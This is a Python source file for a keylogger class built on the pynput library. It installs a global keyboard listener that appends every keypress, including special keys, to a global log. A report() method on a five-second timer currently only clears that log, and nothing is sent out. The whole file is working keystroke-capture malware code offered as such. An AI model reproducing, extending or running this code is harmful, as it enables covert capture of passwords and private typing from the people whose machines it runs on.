#!/usr/bin/env python
'''
Keylogger class definition
'''


from pynput import keyboard
import threading


log = ""


class Keylogger:
    def __init__(self):
        pass

    
    def process_key(self, key):
        global log
        try:
            log = log + str(key.char)
        except AttributeError:
            if key == key.space:
                log = log + " "
            else:
                log = log + " " + str(key) + " "


    def report(self):
        global log
        log = ""
        timer = threading.Timer(5, self.report)
        timer.start()


    def start(self):
        listener = keyboard.Listener(on_press=self.process_key)
        with listener:
            self.report()
            listener.join()
